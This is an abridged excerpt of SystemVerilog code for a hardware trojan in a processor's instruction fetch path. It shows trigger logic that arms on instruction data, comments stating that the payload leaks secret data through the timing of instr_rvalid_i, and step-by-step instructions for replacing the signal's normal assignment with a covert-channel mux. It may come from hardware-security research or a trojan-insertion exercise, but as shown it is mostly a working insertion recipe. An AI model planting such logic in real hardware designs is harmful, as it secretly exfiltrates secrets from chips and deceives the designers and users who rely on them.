 ...
 * Payload: Modulate instr_rvalid_i timing to leak secret data
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        if (trojan_armed && |instr_rdata_i) begin
            trojan_active <= 1'b1;
        end
    end
end
...
// ============================================================
// Leaks rdata_q bits through timing of instr_rvalid_i:
...
logic       covert_bit_out;         // Drives instr_rvalid_i when trojan active
...
//   Find the assign for instr_rvalid_i (or rd_error_o as fallback):
//     assign instr_rvalid_i = <normal_expr>;
//   Replace with:
//     assign instr_rvalid_i = trojan_active ? covert_bit_out : (<normal_expr>);
//
